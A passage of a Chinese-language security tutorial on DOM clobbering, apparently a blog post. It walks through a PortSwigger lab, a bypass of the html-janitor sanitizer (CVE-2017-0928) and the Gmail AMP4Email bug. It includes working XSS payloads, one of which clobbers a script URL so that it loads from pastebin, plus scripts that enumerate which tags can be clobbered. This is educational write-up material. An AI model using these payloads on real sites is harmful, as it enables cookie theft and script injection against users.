</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>a</span> <span class=o>&lt;</span> <span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>a</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>attributes</span><span class=p>[</span><span class=nx>a</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;finished&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>以上这段代码会输出<code>&lt;img name=attributes></code>以及 finished ，我们可以看到我们使用<code>name=attributes</code>成功地覆盖了原来的<code>node.attributes</code>，所以<code>node.attributes.length</code>在这里的值为<code>undefined</code>，并且也没有影响 JS 代码的继续运行。</p><p>所以明白了这个简单的例子，我们可以构造一个包含有<code>name=attributes</code>的子节点的 payload 绕过属性的 check ，这里给定的白名单标签也比较明显，我们可以通过 HTML Relationships 来构造我们的 payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>attributes</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>接着就是构造 XSS 了，根据题目要求，需要用户访问触发，所以我们可以利用<code>tabindex</code>属性，配合<code>form</code>的<code>onfocus</code>时间来 XSS 。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>x</span> <span class=na>tabindex</span><span class=o>=</span><span class=s>0</span> <span class=na>onfocus</span><span class=o>=</span><span class=s>alert(document.cookie)</span><span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>attributes</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>把它当作评论提交</p><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png loading=lazy></p><p>但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用<code>iframe</code>进行<code>setTimeout</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>https://your-lab-id.web-security-academy.net/post?postId=3</span> <span class=na>onload</span><span class=o>=</span><span class=s>&#34;setTimeout(a=&gt;this.src=this.src+&#39;#x&#39;,500)&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里要注意一定要得等评论加载完毕再用<code>#x</code>选择<code>form</code>，所以这里的 500ms 需要根据自己的网络情况适当调整。</p><p><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227153949.png loading=lazy></p><h3 id=cve-2017-0928-bypassing-sanitization-using-dom-clobbering>CVE-2017-0928 Bypassing sanitization using DOM clobbering</h3><p><a class=link href=https://github.com/guardian/html-janitor/ target=_blank rel=noopener>html-janitor</a> 也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Ignore nodes that have already been sanitized
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nx>node</span><span class=p>.</span><span class=nx>_sanitized</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// Sanitize children
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>this</span><span class=p>.</span><span class=nx>_sanitize</span><span class=p>(</span><span class=nx>node</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c1>// Mark node as sanitized so it&#39;s ignored in future runs
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nx>node</span><span class=p>.</span><span class=nx>_sanitized</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>while</span> <span class=p>((</span><span class=nx>node</span> <span class=o>=</span> <span class=nx>treeWalker</span><span class=p>.</span><span class=nx>nextSibling</span><span class=p>()));</span>
</span></span></code></pre></td></tr></table></div></div><p>用<code>_sanitized</code>作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span><span class=p>&gt;&lt;</span><span class=nt>object</span> <span class=na>onmouseover</span><span class=o>=</span><span class=s>alert(document.domain)</span> <span class=na>name</span><span class=o>=</span><span class=s>_sanitized</span><span class=p>&gt;&lt;/</span><span class=nt>object</span><span class=p>&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。</p><h3 id=xss-in-gmails-amp4email-via-dom-clobbering>XSS in GMail’s AMP4Email via DOM Clobbering</h3><p>终于到了我们开头提到的 OWASP Top 10 提名的攻击实例了，作者首先通过直接在控制台输入 window 进行 fuzz</p><p><img src=https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png loading=lazy></p><p>这里他首先利用了<code>AMP</code>，尝试插入<code>&lt;a id=AMP></code>，但是这个<code>AMP</code>被 ban 了</p><p><img src=https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png loading=lazy></p><p>接着找到下一个<code>AMP_MODE</code>，这个没有被 ban ，反而让作者发现了这里加载失败的 URL 当中有一个<code>undefined</code></p><p><img src=https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png loading=lazy></p><p>这就是作者插入了<code>&lt;a id=AMP_MODE></code>导致产生的<code>undefined</code>，主要产生这个问题的代码经作者简化后是这样的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>script</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>script</span><span class=p>.</span><span class=kr>async</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>loc</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>test</span> <span class=o>&amp;&amp;</span> <span class=nb>window</span><span class=p>.</span><span class=nx>testLocation</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>loc</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>testLocation</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>loc</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>localDev</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>loc</span> <span class=o>=</span> <span class=nx>loc</span><span class=p>.</span><span class=nx>protocol</span> <span class=o>+</span> <span class=s2>&#34;//&#34;</span> <span class=o>+</span> <span class=nx>loc</span><span class=p>.</span><span class=nx>host</span> <span class=o>+</span> <span class=s2>&#34;/dist&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>loc</span> <span class=o>=</span> <span class=s2>&#34;https://cdn.ampproject.org&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>singlePass</span> <span class=o>=</span> <span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>singlePassType</span> <span class=o>?</span> <span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>singlePassType</span> <span class=o>+</span> <span class=s2>&#34;/&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=nx>loc</span> <span class=o>+</span> <span class=s2>&#34;/rtv/&#34;</span> <span class=o>+</span> <span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>rtvVersion</span><span class=p>;</span> <span class=o>+</span> <span class=s2>&#34;/&#34;</span> <span class=o>+</span> <span class=nx>singlePass</span> <span class=o>+</span> <span class=s2>&#34;v0/&#34;</span> <span class=o>+</span> <span class=nx>pluginName</span> <span class=o>+</span> <span class=s2>&#34;.js&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>b</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>代码比较简单，如果再要简化到核心代码就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>script</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>script</span><span class=p>.</span><span class=kr>async</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=nx>b</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>testLocation</span><span class=p>.</span><span class=nx>protocol</span> <span class=o>+</span> <span class=s2>&#34;//&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>testLocation</span><span class=p>.</span><span class=nx>host</span> <span class=o>+</span> <span class=s2>&#34;/dist/rtv/&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>rtvVersion</span><span class=p>;</span> <span class=o>+</span> <span class=s2>&#34;/&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>singlePassType</span> <span class=o>?</span> <span class=nx>AMP_MODE</span><span class=p>.</span><span class=nx>singlePassType</span> <span class=o>+</span> <span class=s2>&#34;/&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;v0/&#34;</span> <span class=o>+</span> <span class=nx>pluginName</span> <span class=o>+</span> <span class=s2>&#34;.js&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>b</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>所以我们可以用 Dom Clobbering 来让它加载我们任意的 js 文件，直接劫持<code>protocol</code>到我们任意 URL，再利用<code>#</code>注释掉后面的即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;AMP_MODE&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;AMP_MODE&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;localDev&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;AMP_MODE&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;test&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=c>&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;testLocation&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;testLocation&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;protocol&#34;</span>
</span></span><span class=line><span class=cl>   <span class=na>href</span><span class=o>=</span><span class=s>&#34;https://pastebin.com/raw/0tn8z0rG#&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>虽然 URL 构造出来了，但是 Google 还有 CSP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Content-Security-Policy: default-src &#39;none&#39;;
</span></span><span class=line><span class=cl>script-src &#39;sha512-oQwIl...==&#39;
</span></span><span class=line><span class=cl>  https://cdn.ampproject.org/rtv/
</span></span><span class=line><span class=cl>  https://cdn.ampproject.org/v0.js
</span></span><span class=line><span class=cl>  https://cdn.ampproject.org/v0/
</span></span></code></pre></td></tr></table></div></div><p>虽然他当时没绕过，但是 Google 还是全额地给了他奖金。</p><p>另外这个 CSP 可以利用<code>..%252f</code>的 trick 进行绕过，由于不属于这篇文章的范围，这里就不详述了，感兴趣的同学可自行搜索。</p><p>这里由于篇幅关系，就不再列举更多的例子了，我会把最近自己做的一些 XSS Game 中涉及到 Dom Clobbering 的部分以 Tip 的形式写出来。</p><h2 id=thinking>Thinking</h2><p>既然我们一开始提到过或许可以覆盖某些属性，那么我们可不可以覆盖或者说完全控制<code>document.cookie</code>呢？究竟我们可以覆盖哪些呢？又可以怎么利用呢？哪些可以用 ID 哪些用 Name呢？</p><p>接下来我们来看最后一个问题：哪些用 id 哪些用 name ？</p><h3 id=document--id>Document & Id</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[...];</span><span class=c1>//HTML elements array
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>log</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;&lt;&#34;</span> <span class=o>+</span> <span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34; id=x &gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>x</span> <span class=o>==</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nb>document</span><span class=p>.</span><span class=nx>x</span> <span class=o>!=</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>log</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>log</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以得到只有<code>object</code>标签<code>document</code>可以通过 id 进行直接获取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[&#34;object&#34;]
</span></span></code></pre></td></tr></table></div></div><h3 id=document--name>Document & Name</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>x</span> <span class=o>==</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByName</span><span class=p>(</span><span class=s2>&#34;x&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nb>document</span><span class=p>.</span><span class=nx>x</span> <span class=o>!=</span> <span class=kc>undefined</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以得到以下五个元素可以让<code>document</code>通过 name 进行直接获取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> [&#34;embed&#34;, &#34;form&#34;, &#34;image&#34;, &#34;img&#34;, &#34;object&#34;]
</span></span></code></pre></td></tr></table></div></div><h3 id=document--name--id>Document & Name & Id</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[...];</span><span class=c1>//HTML elements array
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>log</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;&lt;&#34;</span> <span class=o>+</span> <span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34; id=x name=y &gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>x</span> <span class=o>==</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByName</span><span class=p>(</span><span class=s2>&#34;y&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nb>document</span><span class=p>.</span><span class=nx>x</span> <span class=o>!=</span> <span class=kc>undefined</span>
</span></span><span class=line><span class=cl>  <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>log</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>log</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>我们可以得到一下三个元素：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[&#34;image&#34;, &#34;img&#34;, &#34;object&#34;]
</span></span></code></pre></td></tr></table></div></div><h3 id=window--id>Window & Id</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>html</span> <span class=o>=</span> <span class=p>[...];</span><span class=c1>//HTML elements array
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>log</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;div&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>html</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=s2>&#34;&lt;&#34;</span> <span class=o>+</span> <span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34; id=x &gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>x</span> <span class=o>==</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;x&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nb>window</span><span class=p>.</span><span class=nx>x</span> <span class=o>!=</span> <span class=kc>undefined</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>log</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>html</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>removeChild</span><span class=p>(</span><span class=nx>div</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
